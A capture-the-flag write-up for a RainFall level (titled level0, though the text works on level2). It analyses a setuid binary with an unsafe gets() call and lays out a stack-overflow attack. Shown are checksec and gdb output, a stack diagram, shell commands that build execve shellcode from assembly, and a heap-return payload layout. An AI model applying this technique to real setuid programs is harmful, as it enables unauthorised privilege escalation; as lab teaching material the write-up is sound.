# RainFall (level0)

In this project, we try to **exploit binaries**.
By doing so, we wish to read the `/home/user/level3/.pass` file, containing our flag serving as the password for the next level.

## Binary decompilation.

It is a **ELF 32-bit x86 LSB** executable as stated by the command `file -b ~/level2` commands.

We use `objdump -d ~/level2` to deassemble the binary. We stored it's truncated result in the [source.asm](./source.asm) file.

We also decompile the binary using a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra). We performed analysis and manual refactoring to isolate the vulnerability and make the relevant C code more readable. The result is saved in the [source.c](./source.c) file and generated through the [decompile.sh](./Ressources/decompile.sh) shell script.

## Binary particularities

By connecting via ssh (cf. [ssh.sh](./Ressources/ssh.sh)), we made some observations.

On login or by executing `checksec --kernel && checksec --file ~/level2`, we discover:
```sh
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
```

The binary is owned by `level3` and has the `setuid` flag set.
```sh
$ ls -la ~/level2
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 /home/user/level2/level2
```

Useful documentation:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASRL): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

## Discovered vulnerability

The decompiled binary (cf. [source](source.c)) is subject to a "Use of Inherently Dangerous Function" ([CWE-242](http://cwe.mitre.org/data/definitions/242.html)) as state by the [`gets()` man page](https://man7.org/linux/man-pages/man3/gets.3.html).

`gets()` does not perform a buffer overrun check. It introduces a **stack-overflow** opportunity.  
In parallel, the kernel and binary do not implement modern security practices *(Stack Canaries, No-eXecute bit)* that would make it harder to exploit.

## Vulnerability analysis

Our binary is compiled for a **32-bit x86** system.  
It contains two user defined functions (`main()`, `p()`).  
In it, the `main()` function merely acts as a wrapper to the `p()` function, thus we will focus on the latter.

Our intention is to execute a `gets()` based **stack overflow** attack to overwrite the **Return Address** and hijack the program's control flow. But before that, we must analyze and visualize relevant parts of the program's [**call stack**](https://en.wikipedia.org/wiki/Call_stack).

### Stack

```ruby
      HIGHER MEMORY ADDRESSES     
+--------------------------------+
|       p's return address       |
+--------------------------------+ <--- p's Stack Frame start (@ 0xbffff72C).
|    main's stack base pointer   |
+--------------------------------+ <--- Stack Base Pointer (EBP @ 0xbffff728).
| |   alignment   |  (8 bytes)   |
| +---------------+ (0xbffff720) |
| |  var ret_addr |  (4 bytes)   |
| +---------------+ (0xbffff71c) |
| |               |              |
| |               |              |
| |               |              |
| |   var buffer  |  (64 bytes)  | (104 bytes)
| |               |              |
| |               |              |
| |               |              |
| +---------------+ (0xbffff6dc) |
| |     unused    |  (24 bytes)  |
| +---------------+ (0xbffff6c4) |
| | argument area |  (4 bytes)   |
+--------------------------------+ <--- Stack Pointer (ESP @ 0xbffff6c0)
      LOWER MEMORY ADDRESSES      
```

### Heap

`p()` invokes `strdup()`. It allocates a memory region via `malloc()`, copies the buffer filled via `gets()` and then returns the base pointer to the given heap region.
That memory region's size would be enough to accomodate the copied string. The returned base address of that memory region is `0x804a008`, as seen below.
```sh
$ gdb -batch -ex "tbreak strdup" -ex "run <<< 'ignore'" -ex "finish" -ex 'printf "eax: 0x%x\n", $eax' ./level2
Temporary breakpoint 1 at 0x80483e0
ignore

Temporary breakpoint 1, 0xb7ea8d30 in strdup () from /lib/i386-linux-gnu/libc.so.6
0x0804853d in p ()
eax: 0x804a008
# hex => \x08\xa0\x04\x08
# octal => \010\240\004\010
```

### Constraints

The environment presents two significant constraints:
1. The binary does not provide **Procedure Linkage Table** ([PLT](https://refspecs.linuxfoundation.org/ELF/zSeries/lzsabi0_zSeries/x2251.html#PROCEDURELINKAGETABLE)) entires for `system()` or `execve()`. It doesn't provide practical **Return-to-PLT** opportunities.
2. `p()` exists permaturely if it detects it's **Return Address** after the `gets()` call starts with `0xb`. This prevents redirection to **libc** and the **stack** as seen in the process memory mapping bellow.

```sh
$ gdb -batch -ex "start" -ex "info proc mappings" ./level2
Temporary breakpoint 1 at 0x8048542

Temporary breakpoint 1, 0x08048542 in main ()
process 18660
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

## Exploit

Due to environmental constraints, our control flow redirection is limited to the **Heap** or **ELF sections**. Given that the [NX](https://ctf101.org/binary-exploitation/no-execute/) bit is disabled, we can execute code directly in the **Heap**.

We decided that the most viable privilege escalation strategy would be to inject an [i386 `sys_execve()`](https://asm.sourceforge.net/syscall.html) [shellcode](https://en.wikipedia.org/wiki/Shellcode) payload in the **Heap** and redirect the code's execution flow there.

Bulding a shellcode byte sequence manually (as an **little-endian hexadecimal or octal** encoded string) is too error-prone. Instead, we generate it from an assembled binary based on the following [exploit.asm](./Ressources/data/exploit.asm) script.

The conversion can be done through the following set of commands
```sh
$ tmpdir=$(mktemp -d);
$ asm_payload_filepath="./data/exploit.asm";

# Compile the assembly program to an object file.
$ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";

# Link the object file into a binary.
$ ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin";

# Extract the content of the ELF .text section as raw bytes.
$ objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin";

# Format the bytes into an octal shellcode payload.
# We use octal because dash's printf implementation does not support the '\xHH' escape format.
$ octal_shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
$ octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
```

We know have all the information needed to build the full exploit payload
```sh
     HIGHER MEMORY ADDRESSES    
+------------------------------+
| Return Address               | (4 bytes)
| -> Points to payload in heap |
+------------------------------+
| EBP filler                   | (4 bytes)
+------------------------------+
| Local variables              |
|                              |
| +---------------+            |
| | Buffer filler | (51 bytes) | (76 bytes)
| +---------------+            |
| |   Shellcode   | (25 bytes) |
| +---------------+            |
|-+---------------+------------+ <--- `gets()` buffer start
     LOWER MEMORY ADDRESSES     
```
